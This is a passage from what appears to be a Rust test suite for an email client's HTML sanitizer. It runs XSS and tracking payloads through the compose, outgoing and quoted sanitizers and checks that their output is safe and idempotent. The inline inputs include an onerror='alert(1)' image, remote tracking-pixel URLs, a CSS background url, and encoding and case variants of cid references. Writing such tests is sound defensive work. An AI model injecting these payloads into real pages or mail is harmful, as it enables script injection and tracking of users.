    // The image-keeping variants: `cid:` images the map names, nothing else.
    let map = cid_map([
        ("x", "pg-x@penguin.invalid"),
        ("logo@acme.example", "pg-logo@penguin.invalid"),
    ]);
    let keep = cid_map([
        ("pg-x@penguin.invalid", "pg-x@penguin.invalid"),
        ("pg-logo@penguin.invalid", "pg-logo@penguin.invalid"),
    ]);
    let extra = [
        r#"<img src="cid:x" onerror="alert(1)"><img src=cid:logo@acme.example width=99999 height="1e3" alt="a&quot;b">"#,
        r#"<img src="https://t.example/p.gif"><img src="data:image/png;base64,AAAA"><img src="//x"><img srcset="cid:x 2x">"#,
        r#"<img src="cid:x" style="width:1px;background:url(https://t.example)"><a href="cid:x">l</a>"#,
        r#"<p><img src="cid:x"><div>b</div></p><img src="cid:%78"><IMG SRC="CID:X">"#,
    ];
    let all = CLASSICS
        .iter()
        .chain(MXSS)
        .chain(CLIENT_CVES)
        .copied()
        .chain(extra);
    for p in all {
        for (name, f, m) in [
            (
                "editor+img",
                sanitize_compose_html_with_images as fn(&str, &crate::compose::CidMap) -> String,
                &map,
            ),
            ("outgoing+img", sanitize_outgoing_html_with_images, &map),
            ("quoted+img", sanitize_quoted_html_with_images, &map),
        ] {
            let once = f(p, m);
            let ctx = format!("{name} {p:?}");
            walk_compose(
                &reparse(&format!("<!DOCTYPE html><body>{once}")).document,
                &ctx,
                true,
            );
            // Re-sanitizing with the ids it now carries changes nothing.
            assert_eq!(f(&once, &keep), once, "{ctx}: not idempotent");
            assert_eq!(
                sanitize_outgoing_html_with_images(&once, &keep),
                once,
                "{ctx}: changed at send"
            );
        }
    }
}
